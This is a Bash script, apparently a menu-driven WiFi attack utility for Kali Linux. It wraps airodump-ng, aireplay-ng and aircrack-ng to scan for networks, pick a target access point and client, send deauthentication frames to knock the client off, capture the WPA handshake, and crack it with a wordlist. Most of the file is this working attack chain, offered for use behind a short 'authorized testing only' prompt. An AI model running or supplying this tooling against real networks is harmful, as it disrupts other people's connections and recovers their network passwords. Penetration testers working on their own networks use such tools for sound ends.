#!/usr/bin/env bash
#
# wifiutil.sh - WiFi recon utility for Kali Linux (CLI)
# Requires: aircrack-ng suite (airmon-ng, airodump-ng), iw, rfkill, ip
#
# Usage: sudo ./wifiutil.sh
#
set -euo pipefail

SCAN_DIR="/tmp/wifiutil-scans"
CAPTURE_DIR="/tmp/wifiutil-captures"
mkdir -p "$SCAN_DIR" "$CAPTURE_DIR"

NET_LIST=()   # each element: "BSSID,CH,PWR,ENC,ESSID"
CLIENT_LIST=()  # each element: "STATION,PWR,PACKETS,BSSID,PROBES"
SEL_BSSID=""
SEL_CH=""
SEL_PWR=""
SEL_ENC=""
SEL_ESSID=""
SEL_STATION=""
SEL_STATION_PWR=""
SEL_STATION_PKTS=""
LAST_IFACE=""
LAST_CAPTURE_CSV=""

# ---------- helpers ----------

require_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "This script must be run as root (sudo ./wifiutil.sh)" >&2
        exit 1
    fi
}

require_bin() {
    command -v "$1" >/dev/null 2>&1 || { echo "Missing dependency: $1" >&2; exit 1; }
}

# Pick a wireless interface instead of hardcoding wlan0 — names vary
# (wlan0, wlp2s0, wlx<mac> for USB adapters).
select_interface() {
    local ifaces
    mapfile -t ifaces < <(iw dev | awk '$1=="Interface"{print $2}')

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        echo "No wireless interfaces found." >&2
        exit 1
    elif [[ ${#ifaces[@]} -eq 1 ]]; then
        echo "${ifaces[0]}"
        return
    fi

    echo "Multiple wireless interfaces found:" >&2
    select iface in "${ifaces[@]}"; do
        [[ -n "$iface" ]] && { echo "$iface"; return; }
    done
}

# Stops NetworkManager/wpa_supplicant from fighting over the interface
# mid-scan (#1 cause of "monitor mode randomly drops").
kill_interfering_processes() {
    airmon-ng check kill >/dev/null 2>&1 || true
}

unblock_radio() {
    rfkill unblock wifi 2>/dev/null || true
    rfkill unblock all 2>/dev/null || true
}

enable_monitor_mode() {
    local iface="$1"
    unblock_radio
    ip link set "$iface" down
    iw dev "$iface" set type monitor
    ip link set "$iface" up
    iw dev "$iface" info | grep -q "type monitor" || {
        echo "Failed to switch $iface into monitor mode." >&2
        echo "Tip: some USB adapters need airmon-ng start $iface instead." >&2
        exit 1
    }
}

restore_managed_mode() {
    local iface="$1"
    ip link set "$iface" down 2>/dev/null || true
    iw dev "$iface" set type managed 2>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || true
}

trim() {
    # Strip leading/trailing whitespace without spawning xargs
    local s="$1"
    s="${s#"${s%%[![:space:]]*}"}"
    s="${s%"${s##*[![:space:]]}"}"
    printf '%s' "$s"
}

# ---------- core actions ----------

safe_name() {
    # Turn ESSID into a filesystem-safe capture prefix piece
    local s="$1"
    s="$(echo "$s" | tr -c 'A-Za-z0-9._-' '_')"
    s="${s##_}"
    s="${s%%_}"
    [[ -z "$s" || "$s" == "hidden" || "$s" == "length"* ]] && s="AP"
    printf '%s' "$s"
}

scan_networks() {
    local iface duration ts prefix csv
    iface="$(select_interface)"
    LAST_IFACE="$iface"
    read -rp "Scan duration in seconds [15]: " duration
    duration="${duration:-15}"

    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )); then
        echo "Duration must be a positive integer." >&2
        return 1
    fi

    kill_interfering_processes
    enable_monitor_mode "$iface"

    ts="$(date +%Y%m%d-%H%M%S)"
    prefix="$SCAN_DIR/scan-$ts"

    echo "Scanning on $iface for ${duration}s..."
    # --write-interval keeps CSV flushed; --output-format csv = structured output
    timeout "$duration" airodump-ng \
        --output-format csv \
        --write-interval 1 \
        --write "$prefix" \
        "$iface" >/dev/null 2>&1 || true

    restore_managed_mode "$iface"

    csv="${prefix}-01.csv"
    if [[ ! -f "$csv" ]]; then
        echo "No scan output produced." >&2
        return 1
    fi

    print_networks "$csv"
}

# airodump CSV: AP table, blank line, then clients. Stop at Station MAC.
parse_networks() {
    local csv="$1" line bssid first_seen last_seen ch speed priv cipher auth pwr beacons iv lan_id length essid
    NET_LIST=()

    while IFS= read -r line || [[ -n "$line" ]]; do
        [[ "$line" == Station\ MAC* ]] && break
        # Skip header / blank lines
        [[ -z "$line" || "$line" == BSSID* ]] && continue

        # Split on comma; ESSID is field 14 (1-based) and may contain commas —
        # take first 13 fields then join the rest as ESSID.
        IFS=',' read -r bssid first_seen last_seen ch speed priv cipher auth pwr beacons iv lan_id length essid_rest <<< "$line" || true

        bssid="$(trim "$bssid")"
        ch="$(trim "$ch")"
        pwr="$(trim "$pwr")"
        priv="$(trim "$priv")"
        essid="$(trim "${essid_rest:-}")"

        [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
        [[ -z "$essid" ]] && essid="<hidden>"

        NET_LIST+=("$bssid,$ch,$pwr,$priv,$essid")
    done < "$csv"
}

print_networks() {
    local csv="$1" i=1 row bssid ch pwr enc essid
    parse_networks "$csv"

    if [[ ${#NET_LIST[@]} -eq 0 ]]; then
        echo "No access points found in scan."
        return
    fi

    printf "\n%-3s %-20s %-4s %-6s %-10s %s\n" "#" "BSSID" "CH" "PWR" "ENC" "ESSID"
    printf '%s\n' "-----------------------------------------------------------------"
    for row in "${NET_LIST[@]}"; do
        IFS=',' read -r bssid ch pwr enc essid <<< "$row"
        printf "%-3s %-20s %-4s %-6s %-10s %s\n" "$i" "$bssid" "$ch" "$pwr" "$enc" "$essid"
        i=$((i + 1))
    done
    echo ""
}

show_last_scan() {
    local latest
    latest="$(ls -t "$SCAN_DIR"/scan-*-01.csv 2>/dev/null | head -n1 || true)"
    if [[ -z "$latest" ]]; then
        echo "No previous scans found."
        return
    fi
    echo "Showing: $latest"
    print_networks "$latest"
}

# Sets SEL_BSSID / SEL_CH / SEL_ESSID (and friends) from NET_LIST.
select_network() {
    if [[ ${#NET_LIST[@]} -eq 0 ]]; then
        echo "No networks in memory — run a scan first (option 1)." >&2
        return 1
    fi
    local idx
    read -rp "Select network # (1-${#NET_LIST[@]}): " idx
    if ! [[ "$idx" =~ ^[0-9]+$ ]] || (( idx < 1 || idx > ${#NET_LIST[@]} )); then
        echo "Invalid selection." >&2
        return 1
    fi
    IFS=',' read -r SEL_BSSID SEL_CH SEL_PWR SEL_ENC SEL_ESSID <<< "${NET_LIST[$((idx - 1))]}"
    SEL_STATION=""
    SEL_STATION_PWR=""
    SEL_STATION_PKTS=""
    CLIENT_LIST=()
    echo "Selected: $SEL_ESSID  BSSID=$SEL_BSSID  CH=$SEL_CH  ENC=$SEL_ENC"
}

# Station MAC table from airodump CSV.
# Columns: Station MAC, First, Last, Power, # packets, BSSID, Probed ESSIDs
parse_clients() {
    local csv="$1"
    local filter_bssid="${2:-}"
    local line station pwr packets bssid probes
    local in_stations=0
    CLIENT_LIST=()

    while IFS= read -r line || [[ -n "$line" ]]; do
        if [[ "$line" == Station\ MAC* ]]; then
            in_stations=1
            continue
        fi
        (( in_stations == 1 )) || continue
        [[ -z "$line" ]] && continue

        IFS=',' read -r station _ _ pwr packets bssid probes_rest <<< "$line" || true
        station="$(trim "$station")"
        pwr="$(trim "$pwr")"
        packets="$(trim "$packets")"
        bssid="$(trim "$bssid")"
        probes="$(trim "${probes_rest:-}")"

        [[ "$station" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
        # Skip not-associated unless no filter (we usually want AP clients only)
        if [[ -n "$filter_bssid" ]]; then
            [[ "${bssid^^}" == "${filter_bssid^^}" ]] || continue
        else
            [[ "$bssid" == "(not associated)" ]] && continue
        fi

        [[ -z "$probes" ]] && probes="-"
        CLIENT_LIST+=("$station,$pwr,$packets,$bssid,$probes")
    done < "$csv"
}

print_clients() {
    local csv="$1"
    local filter_bssid="${2:-$SEL_BSSID}"
    local i=1 row station pwr packets bssid probes

    parse_clients "$csv" "$filter_bssid"

    if [[ ${#CLIENT_LIST[@]} -eq 0 ]]; then
        echo "No connected clients found for ${filter_bssid:-any AP}."
        echo "Tip: leave the capture running longer, or ask a device to generate traffic."
        return 1
    fi

    printf "\n%-3s %-20s %-6s %-8s %-20s %s\n" "#" "STATION" "PWR" "PKTS" "AP BSSID" "PROBES"
    printf '%s\n' "--------------------------------------------------------------------------------"
    for row in "${CLIENT_LIST[@]}"; do
        IFS=',' read -r station pwr packets bssid probes <<< "$row"
        printf "%-3s %-20s %-6s %-8s %-20s %s\n" "$i" "$station" "$pwr" "$packets" "$bssid" "$probes"
        i=$((i + 1))
    done
    echo ""
}

select_client() {
    if [[ ${#CLIENT_LIST[@]} -eq 0 ]]; then
        echo "No clients in memory — run option 5 (find clients) or finish a capture first." >&2
        return 1
    fi
    local idx
    read -rp "Select client # (1-${#CLIENT_LIST[@]}): " idx
    if ! [[ "$idx" =~ ^[0-9]+$ ]] || (( idx < 1 || idx > ${#CLIENT_LIST[@]} )); then
        echo "Invalid selection." >&2
        return 1
    fi
    IFS=',' read -r SEL_STATION SEL_STATION_PWR SEL_STATION_PKTS _ _ <<< "${CLIENT_LIST[$((idx - 1))]}"
    echo "Selected client: $SEL_STATION  (PWR=$SEL_STATION_PWR  PKTS=$SEL_STATION_PKTS)"
    echo "AP: $SEL_ESSID  BSSID=$SEL_BSSID  CH=$SEL_CH"
}

# Timed dump on the selected AP, then list connected stations.
find_clients() {
    if [[ -z "$SEL_BSSID" || -z "$SEL_CH" ]]; then
        echo "No network selected — use option 3 first." >&2
        return 1
    fi

    local iface duration ts prefix csv
    if [[ -n "$LAST_IFACE" ]]; then
        iface="$LAST_IFACE"
    else
        iface="$(select_interface)"
    fi
    LAST_IFACE="$iface"

    read -rp "Client discovery duration in seconds [20]: " duration
    duration="${duration:-20}"
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )); then
        echo "Duration must be a positive integer." >&2
        return 1
    fi

    ts="$(date +%Y%m%d-%H%M%S)"
    prefix="$CAPTURE_DIR/clients-$(safe_name "$SEL_ESSID")-$ts"

    echo
    echo "Looking for clients on $SEL_ESSID ($SEL_BSSID) ch=$SEL_CH for ${duration}s…"
    echo "Command: airodump-ng -c $SEL_CH -w $prefix -d $SEL_BSSID $iface"
    echo

    kill_interfering_processes
    enable_monitor_mode "$iface"

    timeout "$duration" airodump-ng \
        -c "$SEL_CH" \
        -w "$prefix" \
        -d "$SEL_BSSID" \
        --output-format csv \
        --write-interval 1 \
        "$iface" >/dev/null 2>&1 || true

    restore_managed_mode "$iface"

    csv="${prefix}-01.csv"
    LAST_CAPTURE_CSV="$csv"
    if [[ ! -f "$csv" ]]; then
        echo "No capture output produced." >&2
        return 1
    fi

    print_clients "$csv" "$SEL_BSSID" || return 1
    select_client
}

# Targeted capture on the selected AP:
#   airodump-ng -c <CH> -w <prefix> -d <BSSID> <iface>
capture_selected() {
    if [[ -z "$SEL_BSSID" || -z "$SEL_CH" ]]; then
        echo "No network selected — use option 3 first." >&2
        return 1
    fi

    local iface default_name prefix_name prefix csv
    if [[ -n "$LAST_IFACE" ]]; then
        iface="$LAST_IFACE"
        echo "Using interface: $iface"
    else
        iface="$(select_interface)"
    fi
    LAST_IFACE="$iface"

    default_name="Capture-$(safe_name "$SEL_ESSID")"
    read -rp "Capture file prefix [$default_name]: " prefix_name
    prefix_name="${prefix_name:-$default_name}"
    prefix_name="$(basename "$prefix_name")"
    prefix="$CAPTURE_DIR/$prefix_name"

    echo
    echo "Target : $SEL_ESSID"
    echo "BSSID  : $SEL_BSSID"
    echo "Channel: $SEL_CH"
    echo "Iface  : $iface"
    echo "Write  : ${prefix}-01.cap / .csv / .kismet.csv …"
    echo
    echo "Command: airodump-ng -c $SEL_CH -w $prefix -d $SEL_BSSID $iface"
    echo "Connected clients appear in the STATION table below the AP."
    echo "Press Ctrl+C to stop capture, then you can select a client."
    echo

    kill_interfering_processes
    enable_monitor_mode "$iface"

    trap 'echo; echo "Stopping…"; restore_managed_mode "'"$iface"'"; trap - INT TERM EXIT' INT TERM EXIT

    airodump-ng -c "$SEL_CH" -w "$prefix" -d "$SEL_BSSID" "$iface" || true

    trap - INT TERM EXIT
    restore_managed_mode "$iface"

    csv="${prefix}-01.csv"
    LAST_CAPTURE_CSV="$csv"

    echo
    echo "Capture files in $CAPTURE_DIR:"
    ls -lh "$CAPTURE_DIR"/"${prefix_name}"* 2>/dev/null || echo "(none written)"

    if [[ -f "$csv" ]]; then
        echo
        echo "Clients seen on $SEL_ESSID:"
        if print_clients "$csv" "$SEL_BSSID"; then
            select_client
        fi
    fi
}

show_last_clients() {
    local csv="$LAST_CAPTURE_CSV"
    if [[ -z "$csv" || ! -f "$csv" ]]; then
        csv="$(ls -t "$CAPTURE_DIR"/*-01.csv 2>/dev/null | head -n1 || true)"
    fi
    if [[ -z "$csv" || ! -f "$csv" ]]; then
        echo "No capture CSV found. Run option 4 or 5 first."
        return 1
    fi
    echo "Showing clients from: $csv"
    print_clients "$csv" "$SEL_BSSID"
}

# Deauth selected client against selected AP:
#   aireplay-ng --deauth <N> -a <BSSID> -c <STATION> <iface>
# Prefer keeping airodump running at the same time so the handshake is captured.
deauth_selected() {
    if [[ -z "$SEL_BSSID" || -z "$SEL_CH" ]]; then
        echo "No AP selected — use option 3 first." >&2
        return 1
    fi
    if [[ -z "$SEL_STATION" ]]; then
        echo "No client selected — use option 4/5/6 first." >&2
        return 1
    fi

    local iface count with_capture default_name prefix_name prefix dump_pid
    dump_pid=""

    if [[ -n "$LAST_IFACE" ]]; then
        iface="$LAST_IFACE"
        echo "Using interface: $iface"
    else
        iface="$(select_interface)"
    fi
    LAST_IFACE="$iface"

    read -rp "Deauth count (0 = continuous until Ctrl+C) [0]: " count
    count="${count:-0}"
    if ! [[ "$count" =~ ^[0-9]+$ ]]; then
        echo "Count must be an integer >= 0." >&2
        return 1
    fi

    read -rp "Also run airodump in background to catch handshake? [Y/n]: " with_capture
    with_capture="${with_capture:-Y}"

    echo
    echo "AP     : $SEL_ESSID  ($SEL_BSSID)  ch=$SEL_CH"
    echo "Client : $SEL_STATION"
    echo "Iface  : $iface"
    echo "Command: aireplay-ng --deauth $count -a $SEL_BSSID -c $SEL_STATION $iface"
    echo
    echo "Authorized testing only — you must own or have permission for this network."
    read -rp "Continue? [y/N]: " confirm
    [[ "$confirm" =~ ^[Yy]$ ]] || { echo "Cancelled."; return 0; }

    kill_interfering_processes
    enable_monitor_mode "$iface"
    # Lock channel so deauth frames go out on the right frequency
    iw dev "$iface" set channel "$SEL_CH" 2>/dev/null || true

    cleanup_deauth() {
        echo
        echo "Stopping…"
        if [[ -n "$dump_pid" ]] && kill -0 "$dump_pid" 2>/dev/null; then
            kill "$dump_pid" 2>/dev/null || true
            wait "$dump_pid" 2>/dev/null || true
        fi
        pkill -f "aireplay-ng --deauth" 2>/dev/null || true
        restore_managed_mode "$iface"
        trap - INT TERM EXIT
    }
    trap cleanup_deauth INT TERM EXIT

    if [[ "$with_capture" =~ ^[Yy]$ ]]; then
        default_name="Capture-$(safe_name "$SEL_ESSID")"
        read -rp "Capture file prefix [$default_name]: " prefix_name
        prefix_name="$(basename "${prefix_name:-$default_name}")"
        prefix="$CAPTURE_DIR/$prefix_name"
        LAST_CAPTURE_CSV="${prefix}-01.csv"

        echo "Starting airodump → ${prefix}-01.cap"
        airodump-ng -c "$SEL_CH" -w "$prefix" -d "$SEL_BSSID" "$iface" \
            >/dev/null 2>&1 &
        dump_pid=$!
        sleep 1
    fi

    echo "Sending deauth… (Ctrl+C to stop)"
    aireplay-ng --deauth "$count" -a "$SEL_BSSID" -c "$SEL_STATION" "$iface" || true

    cleanup_deauth

    if [[ -n "${prefix:-}" ]]; then
        echo
        echo "Capture files:"
        ls -lh "$CAPTURE_DIR"/"${prefix_name}"* 2>/dev/null || echo "(none)"
        echo "Check for WPA handshake: aircrack-ng ${prefix}-01.cap"
    fi
}

# Crack WPA handshake from a .cap using a wordlist:
#   aircrack-ng Capture-Pat-01.cap -w Password.txt
# Optional: -b BSSID when multiple networks are in the capture.
crack_handshake() {
    local cap_default cap wordlist bssid_arg
    cap_default=""

    if [[ -n "$LAST_CAPTURE_CSV" ]]; then
        cap_default="${LAST_CAPTURE_CSV%.csv}.cap"
        [[ -f "$cap_default" ]] || cap_default=""
    fi
    if [[ -z "$cap_default" ]]; then
        cap_default="$(ls -t "$CAPTURE_DIR"/*-01.cap 2>/dev/null | head -n1 || true)"
    fi

    echo "Capture (.cap) files in $CAPTURE_DIR:"
    ls -1t "$CAPTURE_DIR"/*.cap 2>/dev/null || echo "  (none yet)"
    echo

    read -rp "Path to .cap file${cap_default:+ [$cap_default]}: " cap
    cap="${cap:-$cap_default}"
    if [[ -z "$cap" || ! -f "$cap" ]]; then
        echo "Capture file not found: ${cap:-<empty>}" >&2
        return 1
    fi

    read -rp "Path to wordlist (e.g. Password.txt /rockyou.txt): " wordlist
    if [[ -z "$wordlist" || ! -f "$wordlist" ]]; then
        echo "Wordlist not found: ${wordlist:-<empty>}" >&2
        echo "Tip: place Password.txt next to the capture, or use /usr/share/wordlists/rockyou.txt" >&2
        return 1
    fi

    bssid_arg=()
    if [[ -n "$SEL_BSSID" ]]; then
        read -rp "Use selected BSSID $SEL_BSSID with -b? [Y/n]: " use_b
        use_b="${use_b:-Y}"
        if [[ "$use_b" =~ ^[Yy]$ ]]; then
            bssid_arg=(-b "$SEL_BSSID")
        fi
    fi

    echo
    echo "Command: aircrack-ng $(printf '%q ' "${bssid_arg[@]}")$(printf '%q' "$cap") -w $(printf '%q' "$wordlist")"
    echo "Authorized testing only."
    echo

    # aircrack does not need monitor mode / root for offline crack, but we may be root anyway
    aircrack-ng "${bssid_arg[@]}" "$cap" -w "$wordlist" || true
}

# ---------- menu ----------

main_menu() {
    while true; do
        cat <<EOF

WiFi Utility (Kali) — CLI
1) Scan WiFi networks (monitor mode)
2) Show results from last scan
3) Select a network from the list (BSSID + channel)
4) Capture selected AP  (live airodump → then pick a client)
5) Find clients on selected AP (timed dump)
6) Show / re-select client from last capture
7) Deauth selected client  (aireplay-ng --deauth -a AP -c CLIENT)
8) Crack handshake  (aircrack-ng CAP -w wordlist)
9) Exit
EOF
        if [[ -n "$SEL_BSSID" ]]; then
            echo "   [AP]     $SEL_ESSID  $SEL_BSSID  ch=$SEL_CH"
        fi
        if [[ -n "$SEL_STATION" ]]; then
            echo "   [CLIENT] $SEL_STATION"
        fi
        read -rp "Select an option: " choice
        case "$choice" in
            1) scan_networks ;;
            2) show_last_scan ;;
            3)
                if [[ ${#NET_LIST[@]} -eq 0 ]]; then
                    show_last_scan
                fi
                select_network
                ;;
            4) capture_selected ;;
            5) find_clients ;;
            6)
                show_last_clients && select_client
                ;;
            7) deauth_selected ;;
            8) crack_handshake ;;
            9) exit 0 ;;
            *) echo "Invalid option." ;;
        esac
    done
}

require_root
for b in iw airmon-ng airodump-ng aireplay-ng aircrack-ng ip rfkill timeout; do require_bin "$b"; done
main_menu
